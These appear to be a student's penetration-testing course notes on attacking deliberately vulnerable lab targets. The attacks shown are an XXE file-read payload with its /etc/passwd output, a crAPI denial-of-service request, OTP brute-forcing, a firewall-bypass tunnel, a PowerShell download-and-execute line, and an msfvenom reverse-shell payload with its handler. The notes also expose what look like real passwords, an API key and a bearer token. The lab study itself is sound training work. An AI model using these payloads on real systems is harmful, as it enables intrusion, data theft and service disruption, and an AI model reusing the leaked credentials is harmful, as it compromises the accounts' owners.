	2025-05-010 12:09

Status:

Tags:

# API and Java Web Token Penetration Testing

# 10/05/52
hostnme -i

machine ip 10.0.0.163
http://10.0.0.163:9443/#!/auth

- container 
- setup lab 
- setup dbws 
- connect using ssh 
- download dorker 
- dorker install in ubuntu 
- then download dbws new one 
- follow docker compose 
- docker compose up -d (run in background )


- Understanding how api works 
- using virustotal (26:00)
	- create account 
	- go to api key as .api
	- copy to kail
	- g with version 3
	- ip searching using api
	- | jq for jason format 
- using python
- crate python file 
- then run 

## Virustotal API 
1. create account  
	- email - xenafo3920@jazipo.com
	- p - Abcd123@4
2. Get API key - f5b692597841443677551bf1b9bee451964d2aba1f296d512974dd7f86729323
3. go with  APIv3 [-](https://docs.virustotal.com/reference/overview)
4. remove "ip"
	- | jq (for readable format  )
```bash
curl --request GET \
     --url https://www.virustotal.com/api/v3/ip_addresses/"192.168.0.109" \
     --header 'accept: application/json' \
     --header 'x-apikey: f5b692597841443677551bf1b9bee451964d2aba1f296d512974dd7f86729323'| jq 
```


##  Install Docker Engine on Ubuntu
*  first run 	
```bash
for pkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker containerd runc; do sudo apt-get remove $pkg; done 
```
1. Install using the `apt` repository (make sure use updated version)
```bash
# Add Docker's official GPG key:
sudo apt-get update
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update 
```

2. Install the Docker packages.

```bash
sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```
3. verify 
	docker --version 

## DVWS installing ( Docker Compose)
1. clone git [snoopysecurity/dvws-node]
```bash
git clone https://github.com/snoopysecurity/dvws-node.git 
```
2. cd dvws-node
	1. if  compose id not installed -  
		-  apt install docker-compose 
3. `docker-compose up -d`
	-  if port is already in use then 
		- sudo netstat -tulpn | grep :80
		- sudo systemctl stop apache2 or sudo systemctl stop nginx
- http://192.168.0.109/

## Running nikto or dirb as proxy of  burp
-  using dirb 
	- download seclist  for dirb or any 
	- 

- first partical 
- nikto -h http://192.168.0.105/ -useproxy http://127.0.0.1:8080
- use this payload  

```bash
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE root [ <!ENTITY exploit SYSTEM "file:///etc/passwd"> ]> <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:examples:usernameservice"> <soapenv:Header/> <soapenv:Body> <urn:Username soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <username xsi:type="xsd:string">&exploit;</username> </urn:Username> </soapenv:Body> </soapenv:Envelope> 
```


## setting up crAPI
 
```bash
wget https://github.com/OWASP/crAPI/archive/refs/heads/develop.zip
apt install unzip -y
apt install nano - y
unzip develop. zip
cd crAPI-develop/deploy/docker/
1s - 1a
nano. env #Change IP to 0.0.0.0 from 127.0.0.1
docker compose pull
docker compose -f docker-compose.yml - compatibility up -d
configure your browser with zap/burp
visit IP:8888 and create an account and login
visit IP:8025 open email to find VIN and PIN
go back to crAPI and click on ad vehicle add the vehicle with the VIN and PIN
N V
then do enumeration. 
```


### DDOS Attack 
- make false - true 
- make number_of_repeats":100000
```bash
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: 192.168.0.105:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.105:8888/contact-mechanic?VIN=0TQQQ37LWFY702888
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4ZW5hZm8zOTIwQGphemlwby5jb20iLCJpYXQiOjE3NDY5NjAyMjcsImV4cCI6MTc0NzU2NTAyNywicm9sZSI6InVzZXIifQ.mayafIxvCuC3AQ2sYH56XUrKOi9Eduh2mVCwWMGbLVEA9jh405LbAEaJcdIqqCYTbWeIR70SPgw7VjR5fN9ydewyziNSUB4HmFbvy3URtsKlrOTw7MYRlwHNhuJyg-4ZhvGWlrDhAuFywmQcij8S6h_vMzaBEm1Av64lyjpb00fwBIY0e37AoEAoGqG1xCAPBTYrzs7otylLprYv2adspWnJ5xD5ANayWF-FYUBgZq-pT4Q84YjBecGvMg5CrerXe1Dx_wDMCs8A-scDEU2WkebumMnOXF3MxY1xfebqBhVbRLkelvGgFCmYH9FmLQg56l5-8ze2Eqg_j1qpWaVJVA
Content-Length: 212
Origin: http://192.168.0.105:8888
Connection: keep-alive
Priority: u=0

{"mechanic_code":"TRAC_JME","problem_details":"aa","vin":"0TQQQ37LWFY702888","mechanic_api":"http://192.168.0.105:8888/workshop/api/mechanic/receive_report","repeat_request_if_failed":true,"number_of_repeats":100000} 
```

### details exploit like 
- input payload
```bash
GET http://192.168.0.105:8888/workshop/api/mechanic/mechanic_report?report_id=10 HTTP/1.1
Host: 192.168.0.105:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.105:8888/contact-mechanic?VIN=0TQQQ37LWFY702888
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4ZW5hZm8zOTIwQGphemlwby5jb20iLCJpYXQiOjE3NDY5NjAyMjcsImV4cCI6MTc0NzU2NTAyNywicm9sZSI6InVzZXIifQ.mayafIxvCuC3AQ2sYH56XUrKOi9Eduh2mVCwWMGbLVEA9jh405LbAEaJcdIqqCYTbWeIR70SPgw7VjR5fN9ydewyziNSUB4HmFbvy3URtsKlrOTw7MYRlwHNhuJyg-4ZhvGWlrDhAuFywmQcij8S6h_vMzaBEm1Av64lyjpb00fwBIY0e37AoEAoGqG1xCAPBTYrzs7otylLprYv2adspWnJ5xD5ANayWF-FYUBgZq-pT4Q84YjBecGvMg5CrerXe1Dx_wDMCs8A-scDEU2WkebumMnOXF3MxY1xfebqBhVbRLkelvGgFCmYH9FmLQg56l5-8ze2Eqg_j1qpWaVJVA
Content-Length: 0
Origin: http://192.168.0.105:8888
Connection: keep-alive
Priority: u=0

 
```
- output 
```bash
HTTP/1.1 200 OK
Server: openresty/1.25.3.1
Date: Sun, 11 May 2025 10:46:42 GMT
Content-Type: application/json
Connection: keep-alive
Allow: GET, HEAD, OPTIONS
Vary: origin, Cookie
access-control-allow-origin: *
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Content-Length: 295

{"id":10,"mechanic":{"id":2,"mechanic_code":"TRAC_JME","user":{"email":"james@example.com","number":""}},"vehicle":{"id":6,"vin":"0TQQQ37LWFY702888","owner":{"email":"xenafo3920@jazipo.com","number":"99912955096"}},"problem_details":"aa","status":"pending","created_on":"11 May, 2025, 10:45:34"} 
```
### file expolit
- input payload 

```bash
POST /dvwsuserservice HTTP/1.1
Host: 192.168.0.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer null
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8
Content-Length: 597
Origin: http://192.168.0.105
Connection: keep-alive
Referer: http://192.168.0.105/admin.html
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [ <!ENTITY exploit SYSTEM "file:///etc/passwd"> ]>

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:examples:usernameservice">

   <soapenv:Header/>

   <soapenv:Body>

      <urn:Username soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">

         <username xsi:type="xsd:string">&exploit;</username>

      </urn:Username>

   </soapenv:Body>

</soapenv:Envelope> 
```
- output 

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/xml; charset=utf-8
Content-Length: 1407
ETag: W/"57f-+s2JBRIrBR54b80IUIKHwmgU738"
Date: Sun, 11 May 2025 09:41:36 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:examples:usernameservice">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:UsernameResponse soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <username xsi:type="xsd:string">User Not Found:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
pn:x:1000:1000::/home/pn:/bin/bash
</username>
    </urn:UsernameResponse>
  </soapenv:Body>
</soapenv:Envelope> 
```


### burit force 

- go forget password 
- send to interduer 
- v3 -v2
- use aother email 
xenafo3920@jazipo.com
Admin@123

- input file 

```bash
POST /identity/api/auth/v2/check-otp HTTP/1.1
Host: 192.168.0.105:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.105:8888/forgot-password
Content-Type: application/json
Content-Length: 69
Origin: http://192.168.0.105:8888
Connection: keep-alive
Priority: u=0

{"email":"james@example.com","otp":"§3452§","password":"Admin@123"} 
```
• Sequential • Random
0000
9999
Min integer digits: k
4
Max integer digits:
4


do agin money increase  
### References

- to learn  
- how  host website without saving in local /etc/host 
- change port to different 80->  
- https://jwt.io/



# 17/05/25
Tunneling


Start Meta2 and Two Windows
From One Windows Connect to Meta2 via tp and transfer some files
confirm its working.
After you confirm its working, block tp port in windows firewall outbound.
now if you try to connect, you should not be able to connect.
htthost
httport
targeted.org

download link 
-  port-   https://hscloud.001193.xyz:1111/s/k357kyobN4sNWqK?openfile=true
- host-  https://hscloud.001193.xyz:1111/s/spNMSJsowwPKiEn?openfile=true


- on host machine download htthost 
	- check two box 
	- and set password 
- on target download httport 
	- go to port mapping 
	- click on add mapping 
		- give name as ftp 
		- local port 21
		- remote ip (meta2)
		- remote port 21
	- proxy menu
		- ip ( host ip)
		- port 80
		- password
		- mode - remote host
		-  ip ( host ip)
		- port 80
- ftp 127.0.0.1 


Start Meta2 and Two Windows
From One Windows Connect to Meta2 via ftp and transfer some files
confirm its working.
After you confirm its working, block ftp port in windows firewall outbound.
now if you try to connect, you should not be able to connect.
In Home Windows, Turn off firewall, download httphost extract and run htthost exefile
goto options, set password, tick both check boxes and save.
In office windows, download httport, install, open
goto portmapping create new, local port and remote port are 21, and remote host is meta2ip
goto proxy, under host give home windows ip and port 80, give password from htthost, bypass mode is remote host
provide host windows ip and 80 port again. save.
now try to connect to loopback on ftp, ftp 127.0.0.1, you shoudl be able to bypass firewall restriction and access.
https://gofile.io/d/DnUxe7

- Download windows server 2012
- data center
- active dictoery 
- download frame work
	- .net frame work
	- aspent
	- dns server
	- group 
- create forest : cpen
- dns cpen.ac
-  how to add computers to active  directory 
	- add permeant dns of server to computers 
	- add local dns for internet 





```bash
 [Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls, Ssl3" IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/chinnidiwakar/vulnerable-AD/master/vulnad.ps1"));
Invoke-VulnAD -UsersLimit 100 -DomainName "cpen.ac"
setspn -s http/WinServer12.cpen.ac:80 dccoadmin

```

## hacking windows 7 

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALIIP LPORT=1234 -f exe -o
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=1234 -f exe -o file.exe
file.exe
pythons -m http.server 80
```


```bash
msfdb run
use multi/handler
set PAYLOAD payload/windows/meterpreter/reverse_tcp  
set LHOST 192.168.0.116
set LPORT 1234
exploit 
```


```bash
use  exploit/windows/local/bypassuac

```


- p- gitlab - Zy3pU2r$kV*XFaeM
- win server 12 - May@123
- ne4j
	- u- neo4j
	- p- may@123
- bloodhound 
- u -admin 
- p -jy8u@LH!bJMGrkDK

- dowlload .netframe work 
- username  - WIN7\win7
- 

# 08WindowsExploitation and PrivilegeEscalation



### Exploiting Windows 7  
### How to add windows machine to active directory
1. go to control panel then -> system properties 
2. then click on change 

#### installing .net framework
- things to do to  install .net framework  
	- .net 4.8 framework 
	- MicrosoftRootCertificateAuthority2011
	- windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c
	- windows6.1-kb4490628-x64_d3de52d6987f7c8bdc2c015dca69eac96047c76e
	  

Setting up active directory 
- adding window 7 in ad 
-  make sure under preferred DNS as only (192.168.0.104) and left other blank 
	![[intrt.png]]

# 09 Active Directory 
## blood hound 
### Fixing PGSQL Error

```bash
sudo service postgresql start
sudo -u postgres psql <<EOF
UPDATE pg_database SET datallowconn = TRUE WHERE datname = 'template1';
SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname = 'template1';
ALTER DATABASE template1 REFRESH COLLATION VERSION;
ALTER DATABASE postgres REFRESH COLLATION VERSION;
EOF
 
```
### blood hound setup 

```bash
sudo apt install bloodhound -y
bloodhound-setup 
```
Setting up neo4j

```bash
 sudo neo4j console

```
Step 1: login setup
-  login  default neo4j
	- u -  neo4j
	- p - neo4j
- change new login
	- u- neo4j
	- p- may@123
- change password from database 
- sudo nano /etc/bhapi/bhapi.json 
	
	```bash
	  "neo4j": {
    "addr": "localhost:7687",
    "username": "neo4j",
    "secret": "toor" - here 
```
Step 2 : Blood hound  login setup 
- blood hound login 
	-  u- admin
	- new password 
		- p- jy8u@LH!bJMGrkDK
Step 3: Download sharhound file 
-  download sharphound file 
	- GitHub [page ](https://github.com/SpecterOps/SharpHound/releases/tag/v2.6.6) 
	- Github [file](https://github.com/SpecterOps/SharpHound/releases/download/v2.6.6/SharpHound_v2.6.6_windows_x86.zip) 
-  run this file in windows 7 and share .zip file as output to kali  
- upload it into blood hound 